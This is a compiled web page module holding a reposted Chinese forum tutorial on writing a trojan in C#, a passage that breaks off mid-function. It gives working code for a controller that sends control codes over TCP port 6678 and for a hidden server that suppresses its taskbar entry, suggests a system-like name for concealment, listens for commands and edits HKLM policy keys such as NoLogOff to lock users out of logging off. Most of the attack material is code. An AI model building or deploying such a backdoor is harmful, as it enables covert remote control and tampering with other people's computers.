import{_ as n,o as s,c as a,a as t}from"./app-f0851ed3.js";const p={},o=t(`<h1 id="用c-实现木马程序-分析-转载" tabindex="-1"><a class="header-anchor" href="#用c-实现木马程序-分析-转载" aria-hidden="true">#</a> 用C#实现木马程序（分析）（转载）</h1><div class="language-txt" data-ext="txt"><pre class="language-txt"><code>freeworm
等级：侠之大者
财产：3100
经验：4075
魅力：898
注册：2002-9-5
登录：2003-4-7
文章：191
签定：河南省平顶山市
</code></pre></div><h2 id="用c-实现木马程序-分析-转载-1" tabindex="-1"><a class="header-anchor" href="#用c-实现木马程序-分析-转载-1" aria-hidden="true">#</a> 用C#实现木马程序（分析 转载）</h2><p>前一段时间我写了一个关于用C#木马的程序（程序见前），抱歉没有写分析，让大家难过了，现在补上：）。</p><h3 id="前言" tabindex="-1"><a class="header-anchor" href="#前言" aria-hidden="true">#</a> 前言</h3><p>我的技术不是很好，如果你是为了学习木马技术也许没有什么启发，这篇文章为了给学习C#的朋友。</p><h3 id="木马的介绍-参照黑客防线2000-2001精华本中的木马原理揭秘" tabindex="-1"><a class="header-anchor" href="#木马的介绍-参照黑客防线2000-2001精华本中的木马原理揭秘" aria-hidden="true">#</a> 木马的介绍：（参照黑客防线2000-2001精华本中的木马原理揭秘）</h3><p>因为本程序是木马程序，所以在介绍之前有一些木马构成的基本知识事先说明，因为下面很多地方会提到这些内容。一个完整的木马系统由硬件部分，软件部分和具体连接部分组成。这里主要对软件部分介绍，它主要有控制端程序、木马程序（后台服务程序）、木马配制程序组成。控制端用以远程控制服务端的程序；木马程序是潜入服务端内部，获取其操作权限的程序；木马配制程序是设置木马程序的端口号，触发条件，木马名称等，使其在服务端藏的更隐蔽的程序。</p><h3 id="使用的技术" tabindex="-1"><a class="header-anchor" href="#使用的技术" aria-hidden="true">#</a> 使用的技术</h3><p>控制端程序发送控制码控制服务器，服务器后台运行，修改注册表达到控制的目的。技术不是很难的，主要体现C#的网络编程和注册表的修改。</p><h3 id="控制端开发" tabindex="-1"><a class="header-anchor" href="#控制端开发" aria-hidden="true">#</a> 控制端开发</h3><p>控制端向服务器发出一段控制码，服务端（木马程序）收到控制码后，根据控制的要求，完成指定的要求，如果服务器完成工作，返回成功的信息。</p><h3 id="控制端的开发" tabindex="-1"><a class="header-anchor" href="#控制端的开发" aria-hidden="true">#</a> 控制端的开发</h3><p>控制码的设定你可以自已设定，不需要详解，主要有以下几个难点。</p><p>1 连接请求</p><p>使用了.NET类中的 System.Net.Sockets.TcpClient类,</p><p><code>TcpClient(string hostname,int port)</code></p><p>Hostname 是要控制的主机名称，当然你也可以用IP地址。<br><br> Port是端口。</p><div class="language-csharp" data-ext="cs"><pre class="language-csharp"><code><span class="token comment">// System.EventArgs包含事件数据类的基类  </span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets</span><span class="token punctuation">;</span>
<span class="token keyword">private</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">button7_Click</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">object</span></span> sender<span class="token punctuation">,</span> <span class="token class-name">System<span class="token punctuation">.</span>EventArgs</span> e<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment">//记录操作,在richTextBox控件中增加操作信息  </span>
    richTextBox1<span class="token punctuation">.</span><span class="token function">AppendText</span><span class="token punctuation">(</span><span class="token string">&quot;请求连接&quot;</span> <span class="token operator">+</span> textBox1<span class="token punctuation">.</span>Text <span class="token operator">+</span> <span class="token string">&quot;\\r&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name"><span class="token keyword">int</span></span> port <span class="token operator">=</span> <span class="token number">6678</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span>
    <span class="token punctuation">{</span>
        <span class="token comment">//初始化 TcpClient 类的新实例并连接到指定主机上的指定端口  </span>
        client <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">TcpClient</span><span class="token punctuation">(</span>textBox1<span class="token punctuation">.</span>Text<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">catch</span>
    <span class="token punctuation">{</span>
        MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token string">&quot;服务器不在线!确定是否输入主机名称.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        richTextBox1<span class="token punctuation">.</span><span class="token function">AppendText</span><span class="token punctuation">(</span><span class="token string">&quot;服务器不在线!确定是否输入主机名称.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token comment">//private void buttion</span>
</code></pre></div><p>2测试是否与被控制机连接上。程序的流程是发送控制码看控制端是否有反应，如果有返回则显示控制成功。</p><p>代码如下：</p><div class="language-csharp" data-ext="cs"><pre class="language-csharp"><code><span class="token comment">//提供网络访问的数据流  </span>
<span class="token comment">//private NetworkStream stream;  </span>

<span class="token keyword">private</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">button8_Click</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">object</span></span> sender<span class="token punctuation">,</span> <span class="token class-name">System<span class="token punctuation">.</span>EventArgs</span> e<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment">//纪录操作  </span>
    richTextBox1<span class="token punctuation">.</span><span class="token function">AppendText</span><span class="token punctuation">(</span><span class="token string">&quot;测试连接&quot;</span> <span class="token operator">+</span> <span class="token string">&quot;\\r&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span>
    <span class="token punctuation">{</span>
        stream <span class="token operator">=</span> client<span class="token punctuation">.</span><span class="token function">GetStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>stream<span class="token punctuation">.</span>CanWrite<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token comment">//发送控制码  </span>
            <span class="token class-name"><span class="token keyword">string</span></span> control <span class="token operator">=</span> <span class="token string">&quot;jiance&quot;</span><span class="token punctuation">;</span>
            <span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> <span class="token keyword">by</span> <span class="token operator">=</span> System<span class="token punctuation">.</span>Text<span class="token punctuation">.</span>Encoding<span class="token punctuation">.</span>ASCII<span class="token punctuation">.</span><span class="token function">GetBytes</span><span class="token punctuation">(</span>control<span class="token punctuation">.</span><span class="token function">ToCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            stream<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token keyword">by</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">by</span><span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//下次使用  </span>
            stream<span class="token punctuation">.</span><span class="token function">Flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//启动接收反回数据的线程  </span>
            <span class="token comment">//receive是线程执行的函数，见后面的分析  </span>
            threadReceive <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token constructor-invocation class-name">ThreadStart</span><span class="token punctuation">(</span>receive<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            threadReceive<span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ee<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        richTextBox1<span class="token punctuation">.</span><span class="token function">AppendText</span><span class="token punctuation">(</span>ee<span class="token punctuation">.</span>Message <span class="token operator">+</span> <span class="token string">&quot;\\r&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span>ee<span class="token punctuation">.</span>Message<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><p>3控制生效的代码</p><div class="language-csharp" data-ext="cs"><pre class="language-csharp"><code><span class="token keyword">private</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">button9_Click</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">object</span></span> sender<span class="token punctuation">,</span> <span class="token class-name">System<span class="token punctuation">.</span>EventArgs</span> e<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment">//这里是确定要发送的控制码，RadioButton是窗体控件  </span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>radioButton1<span class="token punctuation">.</span>Checked<span class="token punctuation">)</span> <span class="token punctuation">{</span> control <span class="token operator">=</span> form2<span class="token punctuation">.</span>zhucex<span class="token punctuation">;</span> <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>radioButton2<span class="token punctuation">.</span>Checked<span class="token punctuation">)</span> <span class="token punctuation">{</span> control <span class="token operator">=</span> form3<span class="token punctuation">.</span>zhuces<span class="token punctuation">;</span> <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>radioButton3<span class="token punctuation">.</span>Checked<span class="token punctuation">)</span> <span class="token punctuation">{</span> control <span class="token operator">=</span> warring<span class="token punctuation">;</span> <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>radioButton4<span class="token punctuation">.</span>Checked<span class="token punctuation">)</span> <span class="token punctuation">{</span> control <span class="token operator">=</span> suggest<span class="token punctuation">;</span> <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>radioButton5<span class="token punctuation">.</span>Checked<span class="token punctuation">)</span> <span class="token punctuation">{</span> control <span class="token operator">=</span> form4<span class="token punctuation">.</span>mumawe<span class="token punctuation">;</span> <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>radioButton6<span class="token punctuation">.</span>Checked<span class="token punctuation">)</span> <span class="token punctuation">{</span> control <span class="token operator">=</span> drop<span class="token punctuation">;</span> <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>control <span class="token operator">==</span> <span class="token string">&quot;000000&quot;</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token string">&quot;你没有输入任何控制目标!不发控制信号&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        richTextBox1<span class="token punctuation">.</span><span class="token function">AppendText</span><span class="token punctuation">(</span><span class="token string">&quot;你没有输入任何控制目标!不发控制信号&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>control <span class="token operator">!=</span> <span class="token string">&quot;000000&quot;</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">try</span>
        <span class="token punctuation">{</span>
            <span class="token comment">//记录操作  </span>
            richTextBox1<span class="token punctuation">.</span><span class="token function">AppendText</span><span class="token punctuation">(</span>control <span class="token operator">+</span> <span class="token string">&quot;正在试图控制,等待回应......&quot;</span> <span class="token operator">+</span> <span class="token string">&quot;\\r&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            stream <span class="token operator">=</span> client<span class="token punctuation">.</span><span class="token function">GetStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>stream<span class="token punctuation">.</span>CanWrite<span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> <span class="token keyword">by</span> <span class="token operator">=</span> System<span class="token punctuation">.</span>Text<span class="token punctuation">.</span>Encoding<span class="token punctuation">.</span>ASCII<span class="token punctuation">.</span><span class="token function">GetBytes</span><span class="token punctuation">(</span>control<span class="token punctuation">.</span><span class="token function">ToCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                stream<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token keyword">by</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">by</span><span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span>
                stream<span class="token punctuation">.</span><span class="token function">Flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                threadReceive <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token constructor-invocation class-name">ThreadStart</span><span class="token punctuation">(</span>receive<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                threadReceive<span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token comment">//endif  </span>
        <span class="token punctuation">}</span><span class="token comment">//try  </span>
        <span class="token keyword">catch</span>
        <span class="token punctuation">{</span>
            richTextBox1<span class="token punctuation">.</span><span class="token function">AppendText</span><span class="token punctuation">(</span><span class="token string">&quot;服务器未连接1控制无效!&quot;</span> <span class="token operator">+</span> <span class="token string">&quot;\\r&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token string">&quot;服务器未连接1控制无效!&quot;</span> <span class="token operator">+</span> <span class="token string">&quot;\\r&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token comment">//else if  </span>
<span class="token punctuation">}</span>
</code></pre></div><p>4线程执行的函数</p><div class="language-csharp" data-ext="cs"><pre class="language-csharp"><code><span class="token keyword">private</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment">//设置读取数据的空间  </span>
    <span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> bb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name"><span class="token keyword">byte</span></span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token comment">//读取3个字节,i为实际读取的字节数  </span>
    <span class="token class-name"><span class="token keyword">int</span></span> i <span class="token operator">=</span> stream<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span>bb<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//转换成字符串，如果是中文控制码则用string ss = //System.Text.Encoding.Unicode.GetString(bb);  </span>
    <span class="token class-name"><span class="token keyword">string</span></span> ss <span class="token operator">=</span> System<span class="token punctuation">.</span>Text<span class="token punctuation">.</span>Encoding<span class="token punctuation">.</span>ASCII<span class="token punctuation">.</span><span class="token function">GetString</span><span class="token punctuation">(</span>bb<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//hjc为我设置的服务器的返回码 hjc为连接成功，hkz为控制成功  </span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>ss <span class="token operator">==</span> <span class="token string">&quot;hjc&quot;</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token string">&quot;连接成功&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        richTextBox1<span class="token punctuation">.</span><span class="token function">AppendText</span><span class="token punctuation">(</span><span class="token string">&quot;连接成功&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>ss <span class="token operator">==</span> <span class="token string">&quot;hkz&quot;</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        richTextBox1<span class="token punctuation">.</span><span class="token function">AppendText</span><span class="token punctuation">(</span>control <span class="token operator">+</span> <span class="token string">&quot;控制成功&quot;</span> <span class="token operator">+</span> <span class="token string">&quot;\\r&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span>control <span class="token operator">+</span> <span class="token string">&quot;控制成功&quot;</span> <span class="token operator">+</span> <span class="token string">&quot;\\r&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><p>服务端的开发：</p><p>要实现木马服务的程序，主要实现以下几个功能：后台的运行（隐藏技术），控制码的接收与注册表的修改，下面对这三方面做介绍：</p><p>1．在VC#中，建立一个后台服务程序是很容易的，先建立一个新的C#的Windows应用程序，项目名称自定（不过为了隐藏可使用与系统相近的名称），将窗体属性“ShowInTaskbar”属性设为false,让它运行时不会在任务栏中显示，并将属性“Windowstate”属性设为Mininized即可，这样窗体就可以隐藏运行了。当然你也可以在<code>InitializeComponent()</code>设置，此函数起初始化的作用，在窗体显示前运行，代码如下：</p><div class="language-csharp" data-ext="cs"><pre class="language-csharp"><code><span class="token keyword">private</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">InitializeComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment">//  </span>
    <span class="token comment">// Form1  </span>
    <span class="token comment">//  </span>
    <span class="token comment">//窗体显示的起点和大小  </span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>AutoScaleBaseSize <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Drawing<span class="token punctuation">.</span>Size</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>ClientSize <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Drawing<span class="token punctuation">.</span>Size</span><span class="token punctuation">(</span><span class="token number">368</span><span class="token punctuation">,</span> <span class="token number">357</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//窗体名称  </span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>Name <span class="token operator">=</span> <span class="token string">&quot;Form1&quot;</span><span class="token punctuation">;</span>
    <span class="token comment">//设置属性让它后台运行  </span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>ShowInTaskbar <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">&quot;Form1&quot;</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>WindowState <span class="token operator">=</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Forms<span class="token punctuation">.</span>FormWindowState<span class="token punctuation">.</span>Minimized<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>2． 控制代码的接收，必需在服务程序运行开始就启动，所以侦听线程必需在程序初始化中启动，所以放在窗体的构造函数中，代码注解如下：</p><div class="language-csharp" data-ext="cs"><pre class="language-csharp"><code><span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token function">Form1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//窗体的构造函数  </span>
<span class="token punctuation">{</span>
    <span class="token comment">//  </span>
    <span class="token comment">// Windows 窗体设计器支持所必需的  </span>
    <span class="token comment">//  </span>
    <span class="token function">InitializeComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//  </span>
    <span class="token comment">// TODO: 在 InitializeComponent 调用后添加任何构造函数代码  </span>
    <span class="token comment">//加入你的侦听代码  </span>
    <span class="token comment">//端口你可以自已设定,我使用了固定的端口  </span>
    <span class="token class-name"><span class="token keyword">int</span></span> port <span class="token operator">=</span> <span class="token number">6678</span><span class="token punctuation">;</span>
    <span class="token comment">//System.Net.Sockets.TcpListener是用来在Tcp网络中侦听客户端的  </span>
    listener <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">TcpListener</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//启动侦听  </span>
    listener<span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//增加接收控制码的线程,如果要停止线程可以用 Thread.abort()  </span>
    <span class="token comment">//reControlCode 是线程启动执行的函数，此函数根据接收的控制  </span>
    <span class="token comment">//控制码选取合适的注册表修改函数  </span>
    <span class="token class-name">Thread</span> thread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token constructor-invocation class-name">ThreadStart</span><span class="token punctuation">(</span>reControlCode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    thread<span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>reControlCode函数如下，完整代码见程序</p><div class="language-csharp" data-ext="cs"><pre class="language-csharp"><code><span class="token keyword">private</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">reControlCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment">//设置接收套接字,接收listener.AcceptSocket是返回已经接收的客户的请求  </span>
    socket <span class="token operator">=</span> listener<span class="token punctuation">.</span><span class="token function">AcceptSocket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//如果连接成功执行  </span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>socket<span class="token punctuation">.</span>Connected<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token comment">//接收控制码  </span>
        <span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> <span class="token keyword">by</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name"><span class="token keyword">byte</span></span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token class-name"><span class="token keyword">int</span></span> i <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">Receive</span><span class="token punctuation">(</span><span class="token keyword">by</span><span class="token punctuation">,</span> <span class="token keyword">by</span><span class="token punctuation">.</span>Length<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name"><span class="token keyword">string</span></span> ss <span class="token operator">=</span> System<span class="token punctuation">.</span>Text<span class="token punctuation">.</span>Encoding<span class="token punctuation">.</span>ASCII<span class="token punctuation">.</span><span class="token function">GetString</span><span class="token punctuation">(</span><span class="token keyword">by</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//根据控制码执行不同的功能  </span>

        <span class="token comment">//修改注册表加入编码  </span>
        <span class="token keyword">switch</span> <span class="token punctuation">(</span>ss<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">case</span> <span class="token string">&quot;jiance&quot;</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>测试连接<span class="token punctuation">,</span>返回测试信息  
                <span class="token class-name"><span class="token keyword">string</span></span> str <span class="token operator">=</span> <span class="token string">&quot;hjc&quot;</span><span class="token punctuation">;</span>
                <span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> bytee <span class="token operator">=</span> System<span class="token punctuation">.</span>Text<span class="token punctuation">.</span>Encoding<span class="token punctuation">.</span>ASCII<span class="token punctuation">.</span><span class="token function">GetBytes</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
                socket<span class="token punctuation">.</span><span class="token function">Send</span><span class="token punctuation">(</span>bytee<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bytee<span class="token punctuation">.</span>Length<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token string">&quot;zx1000&quot;</span><span class="token punctuation">:</span>
                <span class="token comment">//修改注册表函数,自已定义，见下面分析  </span>
                <span class="token function">UnLogOff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">//返回控制消息  </span>
                <span class="token function">retMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>

            <span class="token keyword">case</span> <span class="token string">&quot;zx0100&quot;</span><span class="token punctuation">:</span>
                <span class="token comment">//修改注册表函数  </span>
                <span class="token function">UnClose</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">//返回控制消息  </span>
                <span class="token function">retMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token comment">//重复的case功能与前面一样,略掉  </span>
            <span class="token keyword">default</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token comment">//case  </span>
    <span class="token punctuation">}</span><span class="token comment">//while  </span>
<span class="token punctuation">}</span> <span class="token comment">//private void reControlCode</span>
</code></pre></div><p>3．C#中实现注册表的修改，使用了.NET类库中的<code>System.Microsoft.Win32</code>命令空间，它提供两种类型的类：处理由操作系统引发的事件的类和对系统注册表进行操作的类。下面就可以看到它的用法。这里我做了一个修改注册表的子程序：使计算机不能注销。在这之前先了解注册表，在子键<code>SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer</code></p><p>下面设键值<code>NoLogOff</code>为 <code>1</code> 即可使计算机无法注销。在下面的函数中用C#实现对注册表的修改：</p><div class="language-csharp" data-ext="cs"><pre class="language-csharp"><code><span class="token keyword">private</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">UnLogOff</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment">//得到主机的注册表的顶级节点  </span>
    <span class="token class-name">Microsoft<span class="token punctuation">.</span>Win32<span class="token punctuation">.</span>RegistryKey</span> rLocal <span class="token operator">=</span> Registry<span class="token punctuation">.</span>LocalMachine<span class="token punctuation">;</span>
    <span class="token comment">//设置一个注册表子键的变量  </span>
    <span class="token class-name">RegistryKey</span> key1<span class="token punctuation">;</span>
    <span class="token keyword">try</span>
    <span class="token punctuation">{</span>
        <span class="token comment">//函数RegistryKey.OpenSubkey(string registrykey,bool canwrite)检索指定的子键  </span>
        <span class="token comment">//registrykey是用户指定的键值，canwrite 为true则可修改，默认为fasle不可改  </span>
        key1 <span class="token operator">=</span> rLocal<span class="token punctuation">.</span><span class="token function">OpenSubKey</span><span class="token punctuation">(</span><span class="token string">&quot;SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer&quot;</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//设置子键的键名，和值  </span>
        key1<span class="token punctuation">.</span><span class="token function">SetValue</span><span class="token punctuation">(</span><span class="token string">&quot;NoLogOff&quot;</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//关闭打开的子键  </span>
        key1<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//警告字符串设定  </span>
        mystr <span class="token operator">=</span> mystr <span class="token operator">+</span> <span class="token string">&quot;HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer键值Nologoff被修改！请将它置为0!&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">catch</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
    <span class="token comment">//如果不存在自已建立  </span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>key1 <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
